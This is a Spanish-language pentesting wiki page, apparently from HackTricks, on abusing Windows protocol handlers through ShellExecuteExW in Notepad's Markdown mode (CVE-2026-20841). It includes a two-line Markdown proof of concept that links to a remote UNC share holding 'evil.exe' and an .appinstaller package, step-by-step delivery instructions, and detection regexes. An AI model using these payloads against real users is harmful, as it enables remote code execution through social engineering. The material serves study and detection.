# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Las aplicaciones de Windows que renderizan Markdown o HTML pueden entregar los destinos en los que se hace clic a `ShellExecuteExW`. Dado que ShellExecute distribuye los esquemas URI registrados y las asociaciones de archivos, un renderer necesita una allowlist explícita en lugar de asumir que cada link es HTTP(S). El comportamiento de Notepad descrito a continuación corresponde a CVE-2026-20841 y no debe generalizarse a todos los renderers.<sup>[[1]](#references)[[3]](#references)</sup>

## Superficie de ShellExecuteExW en el modo Markdown de Windows Notepad
- Notepad selecciona el modo Markdown **solo para extensiones `.md`** mediante una comparación de cadenas fija en `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Links de Markdown compatibles:
- Estándar: `[text](target)`
- Autolink: `<target>` (renderizado como `[target](target)`), por lo que ambas sintaxis son importantes para los payloads y las detecciones.
- Los clics en los links se procesan en `sub_140170F60()`, que realiza un filtrado débil y después llama a `ShellExecuteExW`.
- `ShellExecuteExW` distribuye a **cualquier protocol handler configurado**, no solo a HTTP(S).<sup>[[1]](#references)</sup>

### Consideraciones sobre el payload
- Cualquier secuencia `\\` en el link se **normaliza a `\`** antes de `ShellExecuteExW`, lo que afecta a la creación de UNC/path y a la detección.
- Los archivos `.md` **no están asociados con Notepad de forma predeterminada**; la víctima aún debe abrir el archivo en Notepad y hacer clic en el link, pero una vez renderizado, el link se puede abrir.
- Esquemas peligrosos de ejemplo:<sup>[[1]](#references)</sup>
- `file://` para lanzar un payload local/UNC.
- `ms-appinstaller://` para activar flujos de App Installer. Otros esquemas registrados localmente también pueden ser abusables.

### PoC mínimo en Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flujo de explotación
1. Crea un **archivo `.md`** para que Notepad lo renderice como Markdown.
2. Inserta un enlace usando un esquema URI peligroso (`file:`, `ms-appinstaller:` o cualquier handler instalado).
3. Entrega el archivo (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB o similar) y convence al usuario de abrirlo en Notepad.
4. Al hacer clic, el **enlace normalizado** se entrega a `ShellExecuteExW` y el handler de protocolo correspondiente ejecuta el contenido referenciado en el contexto del usuario.<sup>[[1]](#references)[[2]](#references)</sup>

## Ideas de detección
- Monitoriza las transferencias de archivos `.md` a través de puertos/protocolos que suelen entregar documentos: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analiza los enlaces Markdown (estándar y autolink) y busca `file:` o `ms-appinstaller:` sin distinguir mayúsculas de minúsculas.
- Regexes proporcionadas por el proveedor para detectar el acceso a recursos remotos:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- La corrección del proveedor descrita por ZDI restringe los objetivos aceptados a archivos locales y HTTP(S). Amplía las detecciones a otros manejadores de protocolo instalados según sea necesario, porque la superficie de ataque registrada varía según el sistema.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Ejecución de código arbitrario en el Bloc de notas de Windows](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC de CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
